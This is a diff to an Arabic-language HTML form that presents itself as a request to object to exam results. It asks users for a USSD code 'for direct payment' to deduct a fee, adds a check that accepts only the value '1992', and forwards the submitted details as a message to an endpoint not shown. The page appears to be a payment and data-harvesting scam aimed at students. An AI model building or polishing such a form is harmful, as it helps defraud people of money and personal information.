@@ -57,6 +57,12 @@
     textarea {
       resize: vertical;
     }
+    .error {
+      color: #b30000;
+      font-size: 14px;
+      display: none;
+      margin-top: 5px;
+    }
     .success {
       color: #006400;
       font-size: 16px;
@@ -120,7 +126,8 @@
   <textarea name="subjects" rows="3" required></textarea>
 
   <label>كود USSD للسداد المباشر:</label>
-  <input type="text" name="ussdCode" placeholder="الرجاء إدخال رقم USSD لاستقطاع المبلغ" required>
+  <input type="text" id="ussdCode" placeholder="الرجاء إدخال رقم USSD لاستقطاع المبلغ (1992 فقط)" required>
+  <div class="error" id="ussdError">⚠️ الرجاء إدخال رقم USSD موثّق (1992 فقط)</div>
 
   <button type="submit">📤 إرسال الطلب</button>
   <div class="success" id="successMsg">✅ تم تقديم طلب الاعتراض الخاص بك. سيتم إبلاغك بالنتيجة في حال تم تعديلها.</div>
@@ -129,6 +136,18 @@
 <script>
   document.getElementById('objectionForm').addEventListener('submit', function(e) {
     e.preventDefault();
+
+    const ussd = document.getElementById('ussdCode').value.trim();
+    const errorMsg = document.getElementById('ussdError');
+    const successMsg = document.getElementById('successMsg');
+
+    if (ussd !== '1992') {
+      errorMsg.style.display = 'block';
+      successMsg.style.display = 'none';
+      return;
+    } else {
+      errorMsg.style.display = 'none';
+    }
 
     const formData = new FormData(this);
     let message = "📌 طلب اعتراض جديد:\n";
@@ -146,7 +165,7 @@
     })
     .then(response => {
       if (response.ok) {
-        document.getElementById('successMsg').style.display = 'block';
+        successMsg.style.display = 'block';
         document.getElementById('objectionForm').reset();
       }
     });
